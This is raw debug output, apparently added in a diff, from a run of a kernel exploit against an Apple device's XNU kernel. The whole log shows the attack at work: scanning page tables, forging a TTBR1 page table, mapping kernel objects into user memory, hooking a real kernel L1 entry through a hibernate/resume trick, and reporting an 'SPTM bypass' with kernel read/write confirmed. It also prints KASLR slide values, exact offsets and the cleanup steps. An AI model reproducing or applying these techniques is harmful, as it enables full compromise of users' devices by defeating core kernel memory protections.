+[pscan] progress: L0[6] L1[233] tables_walked=64 l2_checks=129024
+[pscan] progress: L0[6] L1[1453] tables_walked=96 l2_checks=194560
+[pscan] L0[7] -> L1 table at KVA 0xfffffff048520000
+[pscan] L2 PAGE hit: PA 0x817478000 -> KVA 0xfffffff07aa1c000 (l0=7 l1=61 l2=647, 252552 checks)
+[pscan] scan begin: target PA=0x81747c000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] progress: L0[6] L1[233] tables_walked=64 l2_checks=129024
+[pscan] progress: L0[6] L1[1453] tables_walked=96 l2_checks=194560
+[pscan] L0[7] -> L1 table at KVA 0xfffffff048520000
+[pscan] L2 PAGE hit: PA 0x81747c000 -> KVA 0xfffffff07aa20000 (l0=7 l1=61 l2=648, 252553 checks)
+[ttbr1] sample walk zero_kva=0xffffffa000068000 L1[2]/L2[0]/L3[26] leaf=0xc000081746044b attr=0xc000000000044b
+[ttbr1] leaf attr to use = 0xc000000000044b (LEARNED from a live RW-data leaf)
+[port] port=0x7d73f -> ipc_port=0xffffffed2b07ca90
+[kobj_find] recv_ipc=0xffffffed2b07ca90 v27=0xffffffed2b07caf0
+[kobj_find] SUCCESS: addr=0xffffffec49660000 size=16384 (need 16384)
+[port] port=0x58607 -> ipc_port=0xffffffed2aa20580
+[port] port=0x55e13 -> ipc_port=0xffffffed2af1ddb0
+[kobj_find] recv_ipc=0xffffffed2af1ddb0 v27=0xffffffed2af1de10
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4e40 size=64 (need 64)
+[ppl] mapped PA=0x8bba38000 -> user 0x109b24000 (kobj=0xffffffed2c3c4e40)
+[ttbr1] alloc fake_L1: kva=0xffffffec49660000 PA=0x8bba38000 user=0x109b24000 (zeroed)
+[port] port=0x7e86b -> ipc_port=0xffffffed2b149ff0
+[kobj_find] recv_ipc=0xffffffed2b149ff0 v27=0xffffffed2b14a050
+[kobj_find] SUCCESS: addr=0xffffffec49654000 size=16384 (need 16384)
+[port] port=0x7f1f7 -> ipc_port=0xffffffed2b09ef20
+[port] port=0x7d243 -> ipc_port=0xffffffed2b07e980
+[kobj_find] recv_ipc=0xffffffed2b07e980 v27=0xffffffed2b07e9e0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4ec0 size=64 (need 64)
+[ppl] mapped PA=0x825584000 -> user 0x109268000 (kobj=0xffffffed2c3c4ec0)
+[ttbr1] alloc scratch_L2: kva=0xffffffec49654000 PA=0x825584000 user=0x109268000 (zeroed)
+[port] port=0x57e7b -> ipc_port=0xffffffed2a995b70
+[kobj_find] recv_ipc=0xffffffed2a995b70 v27=0xffffffed2a995bd0
+[kobj_find] SUCCESS: addr=0xffffffec496dc000 size=16384 (need 16384)
+[port] port=0x5682f -> ipc_port=0xffffffed2a9ee230
+[port] port=0x7d86f -> ipc_port=0xffffffed2aceaf20
+[kobj_find] recv_ipc=0xffffffed2aceaf20 v27=0xffffffed2aceaf80
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4f40 size=64 (need 64)
+[ppl] mapped PA=0x890358000 -> user 0x10764c000 (kobj=0xffffffed2c3c4f40)
+[ttbr1] alloc scratch_L3: kva=0xffffffec496dc000 PA=0x890358000 user=0x10764c000 (zeroed)
+[ttbr1] VERIFY branch: fake_L1[3]=0x825584003(->L2 0x825584000 table) L2[0]=0x890358003(->L3 0x890358000 table) L3[0]=0xc00008097e844b(->PA 0x8097e8000 attr 0xc000000000044b) -> OK
+[ttbr1] VERIFY clone: L1[0..7] (except injected slot 3) byte-match = 1 branch_ok=1
+[ttbr1] fake-TTBR1: fake_TTBR1 = PA 0x8bba38000 | self-ref window S = 0xffffffb000000000 | leaf attr 0xc000000000044b | witness PA 0x8097ebff0
+[ttbr1] (deliver: hibernate -> str 0x8bba38000 into dump+0x108(0x69358) -> trigger -> resume -> str through S|(target&0x3FFF) -> restore power thread.)
+[deliver] === (HOOK real-L1[free] -> hook_L3 (B)): hibernate -> swap fake_TTBR1=0x8bba38000 -> trigger -> resume -> write SENTINEL_W to PA 0x8097ebff0 via VA 0xffffffb000003ff0 -> restore pt -> FAITHFUL-RESUME power thread (eret 0x5460@EL1h, x1=orig=0xffffff80000ea090) ===
+[deliver] fc@0xffffffa000068400 ROP@0xffffffa000068800 POST@0xffffffa00006a000 | orig_ctx=0xffffff80000ea090 pt_field=0xffffff80000ea428 | target(pre)=0x460000800000000 | S=0xffffffb000000000
+[fwpt] L2 pte_scan PA=0x8174c8000 ...
+[pscan] scan begin: target PA=0x8174c8000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] progress: L0[6] L1[233] tables_walked=64 l2_checks=129024
+[pscan] progress: L0[6] L1[1453] tables_walked=96 l2_checks=194560
+[pscan] L0[7] -> L1 table at KVA 0xfffffff048520000
+[pscan] L2 PAGE hit: PA 0x8174c8000 -> KVA 0xfffffff07aa6c000 (l0=7 l1=61 l2=667, 252572 checks)
+[fwpt] L2 KVA = 0xfffffff07aa6c000 (PA 0x8174c8000)
+[port] port=0x7f747 -> ipc_port=0xffffffed2b07faf0
+[port] port=0x55c2b -> ipc_port=0xffffffed2aa6b670
+[kobj_find] recv_ipc=0xffffffed2aa6b670 v27=0xffffffed2aa6b6d0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4f80 size=64 (need 64)
+[ppl] mapped PA=0x816ff4000 -> user 0x109b10000 (kobj=0xffffffed2c3c4f80)
+[port] port=0x9c37 -> ipc_port=0xffffffed2b85a1a0
+[port] port=0x59933 -> ipc_port=0xffffffed2a9e70d0
+[kobj_find] recv_ipc=0xffffffed2a9e70d0 v27=0xffffffed2a9e7130
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4fc0 size=64 (need 64)
+[ppl] mapped PA=0x817760000 -> user 0x10760c000 (kobj=0xffffffed2c3c4fc0)
+[port] port=0x7ed87 -> ipc_port=0xffffffed2ad0c970
+[port] port=0x7e793 -> ipc_port=0xffffffed2a996620
+[kobj_find] recv_ipc=0xffffffed2a996620 v27=0xffffffed2a996680
+[kobj_find] SUCCESS: addr=0xffffffed2c3c5000 size=64 (need 64)
+[ppl] mapped PA=0x816fb4000 -> user 0x109b50000 (kobj=0xffffffed2c3c5000)
+[port] port=0x8627 -> ipc_port=0xffffffed2a9ed5d0
+[port] port=0x7ef8b -> ipc_port=0xffffffed2bb7bf70
+[kobj_find] recv_ipc=0xffffffed2bb7bf70 v27=0xffffffed2bb7bfd0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c5040 size=64 (need 64)
+[ppl] mapped PA=0x817740000 -> user 0x1074fc000 (kobj=0xffffffed2c3c5040)
+[port] port=0x7f867 -> ipc_port=0xffffffed2a996ce0
+[port] port=0x58017 -> ipc_port=0xffffffed2b0d9420
+[kobj_find] recv_ipc=0xffffffed2b0d9420 v27=0xffffffed2b0d9480
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4980 size=64 (need 64)
+[ppl] mapped PA=0x816fbc000 -> user 0x102fec000 (kobj=0xffffffed2c3c4980)
+[port] port=0x5754b -> ipc_port=0xffffffed2b07c100
+[port] port=0x5874f -> ipc_port=0xffffffed2ab30220
+[kobj_find] recv_ipc=0xffffffed2ab30220 v27=0xffffffed2ab30280
+[kobj_find] SUCCESS: addr=0xffffffed2c3c50c0 size=64 (need 64)
+[ppl] mapped PA=0x817744000 -> user 0x109b18000 (kobj=0xffffffed2c3c50c0)
+[port] port=0x58a87 -> ipc_port=0xffffffed2b07ece0
+[port] port=0x55f73 -> ipc_port=0xffffffed2ab92f20
+[kobj_find] recv_ipc=0xffffffed2ab92f20 v27=0xffffffed2ab92f80
+[kobj_find] SUCCESS: addr=0xffffffed2c3c49c0 size=64 (need 64)
+[ppl] mapped PA=0x816fb8000 -> user 0x109b1c000 (kobj=0xffffffed2c3c49c0)
+[deliver] redirect LANDED (arm 4, 5 injected): *(power_thread+0x48)=0xffffffa000068400
+[deliver] redirect in place; CADisplayLink quiesced + continuous keepalive stopped -> PULSED active<->idle poll for target==SENTINEL_W (<=150 cycles, 300ms idle gap each).
+[deliver] hibernate dump SPs: SP_EL1@0x69320=0xffffff8000064510 SP_EL0@0x69318=0xffffffa00006a000(=POST_SP) TPIDRRO@0x69328=0xffffffa000068400(=fc_gpuva)
+[deliver] deliver (HOOK real-L1[free] -> hook_L3 (B)): PA 0x8097ebff0 == SENTINEL_W on an XNU_PAGE_TABLE page (scratchA=0xc0dec0dec0dec0de==A?1 scratchPOST=0xab1eab1eab1eab1e==POST?1)
+[deliver] dump@0x69250: resume-PC=0xffffff8000005758(F3->0x5758) TTBR1=0x8bba38000(F2->0x8bba38000) TTBR0=0x8173dc000 TCR=0x140198019 | target read-back=0x4600008518a0603
+[deliver] FAITHFUL RESUME armed (P3 eret 0x5460@EL1h -> fw restores the power thread from orig).
+[deliver] window_VA=0xffffffeffc000000 -> kread=0x0(rc=0) ; benign kva=0xffffffec4965c000 -> 0x0(rc=0) -> window READ LIVE
+[deliver] window WRITE: kwrite(window_VA)=0xb0b0cafeb0b0cafe via necp rc=0 -> benign reads 0xb0b0cafeb0b0cafe(rc=0) -> landed (g_sptm_window.installed=1)
+[own] === own-serve done ===
+[own] continuous keepalive stopped (total submits=27850)
+[verify] broad-bypass window installed -> sptm_kwrite32_pa/kread route through it; characterizing...
+[port] port=0x58993 -> ipc_port=0xffffffed2ab35300
+[kobj_find] recv_ipc=0xffffffed2ab35300 v27=0xffffffed2ab35360
+[kobj_find] SUCCESS: addr=0xffffffec496d8000 size=16384 (need 16384)
+[verify] T-S (kobj XNU_DEFAULT pa=0x89d644000): wrote 0x5a4e1717 read 0x5a4e1717 -> PASS
+[port] port=0x55607 -> ipc_port=0xffffffed2ab5a470
+[kobj_find] recv_ipc=0xffffffed2ab5a470 v27=0xffffffed2ab5a4d0
+[kobj_find] SUCCESS: addr=0xffffffec496d0000 size=16384 (need 16384)
+[verify] real kernel PT page: kva=0xfffffff075a98000 pa=0x8124f4000 safe_slot=0 (off=0x0)
+[verify] witness pte_kva=0xfffffff075a9ada0 pte_val=0x4600008bac6c603 page_pa=0x8bac6c000
+[verify] T-A (XNU_PAGE_TABLE pa=0x8124f4000+0x0 kva=0xfffffff075a98000): pre=0x0 wrote 0xb10ad1 (rc=0) -> kread=0xb10ad1 -> landed
+[verify] === done -> g_discriminator_result=3 ===
+[stab] === repair (keep primitives) ===
+[stab] raced vm_objects to repair: 1
+[stab] kaslr_slide=0x414f4000 vm_kernel_addrperm=0xeab4d61a7ea78ab7
+[stab] [0] obj_id=0xeab4d603c41604b7 base=0x2ea000000 delta=1 -> obj_kva=0xffffffe9456e7a00
+[stab] [0] READ state=0x00420000 (can_sleep=1) owner=0x00000000 ref_count=2 (kr 0/0/0)
+[stab] [0] ref_count 2 -> 67 (necp wr=0, readback=67) OK
+[stab] repaired 1/1 raced objects
+[bringup] cleanup: LEAKING forged/aperture pages (decisive build)
+[agx] === AGX BROAD BYPASS DONE -- cleanup ===
+[agx] LEAKING userclient + bypass window (decisive build) -- avoids the IOServiceClose kfree panic
+=== AGX bring-up returned OK; running discriminator below ===
+=== discriminator=3: T-A landed on a real XNU_PAGE_TABLE page ===
+entry1 bootstrap + SPTM bypass: ALL STAGES OK
+
+=== KREAD BOOTSTRAP ===
+
+KREAD BOOTSTRAP ALREADY ESTABLISHED this launch -- skipping
+
+SPTM BYPASS ALREADY ESTABLISHED this launch -- skipping re-exploit
+Re-running the final broad-bypass test on the live bypass window...
+[port] port=0x7eb8b -> ipc_port=0xffffffed2ab54bb0
+[kobj_find] recv_ipc=0xffffffed2ab54bb0 v27=0xffffffed2ab54c10
+[kobj_find] SUCCESS: addr=0xffffffec496cc000 size=16384 (need 16384)
+[verify] T-S (kobj XNU_DEFAULT pa=0x82b67c000): wrote 0x5a4e1717 read 0x5a4e1717 -> PASS
+[port] port=0x7b977 -> ipc_port=0xffffffed2ad5db70
+[kobj_find] recv_ipc=0xffffffed2ad5db70 v27=0xffffffed2ad5dbd0
+[kobj_find] SUCCESS: addr=0xffffffec496c8000 size=16384 (need 16384)
+[verify] real kernel PT page: kva=0xfffffff075a98000 pa=0x8124f4000 safe_slot=0 (off=0x0)
+[verify] witness pte_kva=0xfffffff075a9ad90 pte_val=0x460000820540603 page_pa=0x820540000
+[verify] T-A (XNU_PAGE_TABLE pa=0x8124f4000+0x0 kva=0xfffffff075a98000): pre=0x0 wrote 0xb10ad1 (rc=0) -> kread=0xb10ad1 -> landed
+[verify] === done -> g_discriminator_result=3 ===
+=== discriminator=3: T-A landed on a real XNU_PAGE_TABLE page ===
+
+SPTM bypass (already established): final test rc=0
+
+=== Teardown ===
+Teardown: closing primitives (revert the kernel-PT hook + release kread bootstrap)...
+[stab] === teardown (close primitives) ===
+[stab] ioref[0] port+4: 4 -> 3 (necp wr=0)
+[stab] ioref[0] port+128: 2 -> 1 (necp wr=0)
+[stab] ioref[1] port+4: 4 -> 3 (necp wr=0)
+[stab] ioref[1] port+128: 2 -> 1 (necp wr=0)
+[stab] cleared dyld special-port slots 0/1 (all_image_info 0x20969b200)
+[stab] unhook: real L1[+0x3ff0]=0x4600008518a0603 (our hook=0x4600008518a0603) l1_pa=0x8097e8000 l1tab=0xfffffff06cd8c000
+[stab] unhook: cleared valid bit of L1[+0x3ff0] (sptm_kwrite32_pa rc=0) -> entry now 0x460000800000000 bit0=0
+[stab] unhook rc=0
+[stab] necp PTE handle torn down (noop thread resumed+joined, kernel-page mapping freed)
+[stab] krw worker torn down (worker stopped+joined, mapped thread page freed)
+[stab] hijack: freed thread-page mapping 0x1067b0000
+[stab] label372 v177 restored: flags=0x11c800 PA=0x0 size@24=0x4000
+[stab] label372 v173 restored: size@32=0x4000
+[stab] label372 named-entry restored via groom
+[stab] === teardown COMPLETE ===: io_references balanced + dyld slots cleared; bypass window unhooked; necp/krw/hijack torn down; label372 named-entry restored (groom).
+Teardown complete.
